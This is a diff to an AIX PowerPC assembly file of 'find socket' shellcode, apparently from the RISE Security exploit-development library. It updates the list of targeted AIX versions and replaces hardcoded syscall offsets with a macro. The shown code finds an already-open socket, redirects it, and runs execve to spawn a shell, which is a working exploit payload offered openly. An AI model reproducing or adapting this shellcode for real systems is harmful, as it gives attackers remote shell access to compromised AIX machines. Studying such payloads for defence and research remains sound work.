@@ -1,7 +1,5 @@
 /*
- *  $Id: aix-power-fndsockcode.S 40 2008-11-17 02:45:30Z ramon $
- *
- *  aix-power-fndsockcode.S - AIX Power Find socket code
+ *  aix-power-fndsockcode.S
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -21,15 +19,16 @@
  */
 
 /*
- * Compile with the following command.
- * $ gcc -Wall -DAIXLEVEL -o aix-power-fndsockcode aix-power-fndsockcode.S
+ * Supported AIX versions:
  *
- * Where AIXLEVEL is one of the currently supported AIX levels.
- * -DV410   AIX 4.1.0
- * -DV420   AIX 4.2.0
- * -DV430   AIX 4.3.0
- * -DV433   AIX 4.3.3
- * -DV530   AIX 5.3.0
+ * -DAIX614     AIX Version 6.1.4
+ * -DAIX613     AIX Version 6.1.3
+ * -DAIX612     AIX Version 6.1.2
+ * -DAIX611     AIX Version 6.1.1
+ * -DAIX5310    AIX Version 5.3.10
+ * -DAIX539     AIX Version 5.3.9
+ * -DAIX538     AIX Version 5.3.8
+ * -DAIX537     AIX Version 5.3.7
  *
  */
 
@@ -59,7 +58,7 @@ fndsockcode:
 
     stu     %r31,-4(%r1)
     mr      %r28,%r1
-    cal     %r27,-511+44(%r29)
+    cal     %r27,-__CAL+44(%r29)
     stu     %r27,-4(%r1)
     mr      %r27,%r1
 
@@ -82,7 +81,7 @@ fndsockcode:
 
     # close
 
-    cal     %r25,-511+2(%r29)
+    cal     %r25,-__CAL+2(%r29)
 
 1:
     mr      %r3,%r25
@@ -103,7 +102,7 @@ fndsockcode:
     bge     1b
 
 shellcode:
-    # lil     %r31,__CAL
+    # lil     %r29,__CAL
     xor.    %r5,%r5,%r5
     bnel    shellcode
     # mflr    %r30
@@ -117,7 +116,6 @@ shellcode:
     stu     %r5,-4(%r1)
     stu     %r3,-4(%r1)
     mr      %r4,%r1
-    # cal     %r2,__NC_execve(%r31)
     cal     %r2,__NC_execve(%r29)
     # crorc   %cr6,%cr6,%cr6
     # .long   0x44ffff02
